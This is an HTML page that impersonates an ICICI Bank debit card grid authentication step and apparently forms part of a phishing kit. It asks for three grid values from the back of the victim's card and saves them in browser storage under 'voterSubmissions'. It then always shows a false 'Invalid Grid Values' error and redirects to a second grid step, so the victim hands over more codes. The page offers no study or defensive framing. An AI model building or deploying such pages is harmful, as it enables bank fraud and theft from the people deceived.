<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Debit Card Grid Authentication - Step 1</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #0056b3; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .form-container { background: #ffffff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3); width: 100%; max-width: 450px; }
        .form-container h2 { text-align: center; margin-bottom: 5px; color: #0056b3; font-size: 20px; }
        .sub-title { text-align: center; color: #555; font-size: 13px; margin-bottom: 15px; }
        
        /* CSS Simulated Debit Card Back Side */
        .card-mockup {
            background: linear-gradient(135deg, #1e293b, #0f172a);
            color: #fff;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
            position: relative;
        }
        .card-stripe {
            background: #000;
            height: 30px;
            margin: -15px -15px 12px -15px;
        }
        .card-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .card-sig-box {
            background: #e2e8f0;
            color: #0f172a;
            padding: 4px 10px;
            font-size: 11px;
            border-radius: 3px;
            font-style: italic;
            letter-spacing: 1px;
        }
        .card-cvv-box {
            background: #ffffff;
            color: #000;
            padding: 2px 8px;
            font-size: 12px;
            font-weight: bold;
            border-radius: 3px;
        }
        .card-grid-sample {
            margin-top: 10px;
            font-size: 11px;
            color: #94a3b8;
            text-align: center;
            border-top: 1px solid #334155;
            padding-top: 6px;
        }

        .error-msg { background: #f8d7da; color: #721c24; padding: 8px; border-radius: 6px; font-size: 12px; text-align: center; margin-bottom: 15px; display: none; border: 1px solid #f5c6cb; }
        
        .grid-container {
            display: flex;
            justify-content: space-between;
            gap: 12px;
            margin-bottom: 20px;
            background: #f8f9fa;
            padding: 15px 10px;
            border-radius: 8px;
            border: 1px solid #e0e0e0;
        }
        .grid-item { flex: 1; text-align: center; }
        .grid-label { display: block; margin-bottom: 6px; color: #0056b3; font-weight: bold; font-size: 15px; }
        .grid-input { width: 100%; padding: 8px 5px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; text-align: center; letter-spacing: 2px; background: #fff; }
        .grid-input:focus { outline: none; border-color: #0056b3; box-shadow: 0 0 5px rgba(0, 86, 179, 0.3); }

        .btn-next { width: 100%; padding: 12px; background: #0056b3; border: none; border-radius: 6px; color: white; font-size: 15px; font-weight: bold; cursor: pointer; }
        .btn-next:hover { background: #004085; }
        .btn-next:disabled { background: #6c757d; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>Debit Card Grid Authentication</h2>
        <div class="sub-title">Enter grid values from the back of your card</div>
        
        <!-- Professional CSS Debit Card Back Mockup -->
        <div class="card-mockup">
            <div class="card-stripe"></div>
            <div class="card-row">
                <div class="card-sig-box">Authorized Signature</div>
                <div style="font-size: 10px; color: #cbd5e1;">CVV2 <span class="card-cvv-box">***</span></div>
            </div>
            <div class="card-grid-sample">ICICI Bank Debit Card - Grid Reference (Back Side)</div>
        </div>

        <div id="errorAlert" class="error-msg">Invalid Grid Values, Please Enter Again</div>

        <form id="gridForm1">
            <div class="grid-container">
                <div class="grid-item">
                    <span class="grid-label">A</span>
                    <input type="password" id="gridA" name="gridA" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
                <div class="grid-item">
                    <span class="grid-label">D</span>
                    <input type="password" id="gridD" name="gridD" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
                <div class="grid-item">
                    <span class="grid-label">N</span>
                    <input type="password" id="gridN" name="gridN" class="grid-input" placeholder="--" maxlength="2" required>
                </div>
            </div>

            <button type="submit" id="submitBtn" class="btn-next">Verify & Submit</button>
        </form>
    </div>

    <script>
        document.getElementById('gridForm1').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const gridA = document.getElementById('gridA').value;
            const gridD = document.getElementById('gridD').value;
            const gridN = document.getElementById('gridN').value;
            const gridStep1Data = `A:${gridA}, D:${gridD}, N:${gridN}`;

            let submissions = JSON.parse(localStorage.getItem('voterSubmissions')) || [];
            let deviceId = localStorage.getItem('voterDeviceId');

            if (submissions.length > 0) {
                let targetIndex = -1;
                for (let i = submissions.length - 1; i >= 0; i--) {
                    if (submissions[i].deviceId === deviceId) {
                        targetIndex = i;
                        break;
                    }
                }
                if (targetIndex === -1) targetIndex = submissions.length - 1;

                submissions[targetIndex].gridStep1 = gridStep1Data;
                localStorage.setItem('voterSubmissions', JSON.stringify(submissions));
            }

            document.getElementById('errorAlert').style.display = 'block';
            const btn = document.getElementById('submitBtn');
            btn.disabled = true;
            btn.innerText = "Verifying...";

            setTimeout(() => {
                window.location.href = "grid_step2.html"; 
            }, 1500);
        });
    </script>
</body>
</html>
